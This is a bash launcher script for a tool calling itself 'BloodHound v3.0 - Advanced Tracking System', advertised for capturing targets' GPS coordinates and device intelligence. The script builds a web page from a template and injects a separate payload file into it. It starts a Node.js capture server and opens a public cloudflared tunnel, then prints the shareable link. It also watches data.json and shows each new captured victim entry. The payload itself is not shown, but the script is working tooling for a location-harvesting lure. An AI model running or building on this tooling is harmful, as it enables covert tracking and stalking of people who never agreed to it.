#!/bin/bash

trap 'printf "\n";stop' 2

banner() {
clear
printf '\n'
printf '\e[1;31m       ██████  ██       ██████   ██████  ██████  ██   ██  ██████  ██    ██ ███    ██ ██████  \n'
printf '       ██   ██ ██      ██    ██ ██    ██ ██   ██ ██   ██ ██    ██ ██    ██ ████   ██ ██   ██ \n'
printf '       ██████  ██      ██    ██ ██    ██ ██   ██ ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██ \n'
printf '       ██   ██ ██      ██    ██ ██    ██ ██   ██ ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ \n'
printf '       ██████  ███████  ██████   ██████  ██████  ██   ██  ██████   ██████  ██   ████ ██████  \e[0m\n\n'
printf '\e[1;31m       ═══════════════════════════════════════════════════════════════════════════════════\n'                                                                                
printf "\e[1;97m                         BloodHound v3.0 - Advanced Tracking System\e[0m \n"
printf "\e[1;31m                                  by Kevil Ravat\e[0m \n"
printf '\e[1;31m       ═══════════════════════════════════════════════════════════════════════════════════\e[0m\n'
printf "\e[1;90m          Track targets with precision. Capture GPS coordinates and device intelligence.\e[0m \n"
printf "\n"
}

dependencies() {
    command -v node > /dev/null 2>&1 || { echo >&2 "I require nodejs but it's not installed. Install it. Aborting."; exit 1; } 
    command -v npm > /dev/null 2>&1 || { echo >&2 "I require npm but it's not installed. Install it. Aborting."; exit 1; } 

    if [ ! -d "node_modules" ]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] Installing Node dependencies...\n"
        npm install
    fi
}

stop() {
    checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
    checknode=$(ps aux | grep -o "node server.js" | head -n1)
    checkdash=$(ps aux | grep -o "node dashboard_server.js" | head -n1)
    
    if [[ $checkcf == *'cloudflared'* ]]; then
        pkill -f -2 cloudflared > /dev/null 2>&1
        killall -2 cloudflared > /dev/null 2>&1
    fi
    if [[ $checknode == *'node'* ]]; then
        pkill -f "node server.js" > /dev/null 2>&1
    fi
    if [[ $checkdash == *'node'* ]]; then
        pkill -f "node dashboard_server.js" > /dev/null 2>&1
    fi
    exit 1
}

start_dashboard() {
    printf "\e[1;31m[\e[0m+\e[1;31m] Starting Dashboard on http://localhost:8081 ...\e[0m\n"
    node dashboard_server.js > /dev/null 2>&1 &
}

# Monitor data.json for new entries
checkfound() {
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
    
    # Simple tail-like functionality for JSON file
    # In a real shell script, parsing JSON updates is hard, so we'll just watch the file size or content
    last_size=0
    if [ -f "data.json" ]; then
        last_size=$(stat -c%s "data.json")
    fi

    while [ true ]; do
        if [ -f "data.json" ]; then
            current_size=$(stat -c%s "data.json")
            if [ $current_size -gt $last_size ]; then
                printf "\n\e[1;92m[\e[0m+\e[1;92m] New data captured!\n"
                # Show the last entry - simplified
                tail -n 20 data.json
                last_size=$current_size
            fi
        fi
        sleep 1
    done 
}

build_site() {
    printf "\e[1;31m[\e[0m+\e[1;31m] Building site from template...\e[0m\n"
    rm -rf public/*
    cp -r template/* public/
    
    # Inject payload into the public/index.html
    sed -i '/tc_payload/r payload.html' public/index.html
}

cf_server() {
    if [[ -e cloudflared ]]; then
        echo "Cloudflared already installed."
    else
        command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
        arch=$(uname -m)
        if [[ $arch == *'arm'* ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
        elif [[ "$arch" == *'aarch64'* ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
        elif [[ "$arch" == *'x86_64'* ]]; then
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
        else
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1 
        fi
    fi
    chmod +x cloudflared
    
    start_dashboard
    build_site
    
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting Node.js server on port 3333...\n"
    echo "3333" > .server_port
    PORT=3333 node server.js > /dev/null 2>&1 &
    
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
    rm cf.log > /dev/null 2>&1 &
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
    sleep 10
    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
        exit 1
    else
        printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
    fi
    
    checkfound
}

local_server() {
    start_dashboard
    build_site
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting Node.js server on Localhost:8080...\n"
    
    echo "8080" > .server_port
    PORT=8080 node server.js > /dev/null 2>&1 & 
    sleep 2
    checkfound
}

hound() {
    # Cleanup old text files
    if [[ -e data.txt ]]; then rm -rf data.txt; fi
    if [[ -e ip.txt ]]; then rm -rf ip.txt; fi
    
    default_option_server="Y"
    read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
    option_server="${option_server:-${default_option_server}}"
    if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
        cf_server
        sleep 1
    else
        local_server
        sleep 1
    fi
}

banner
dependencies
hound
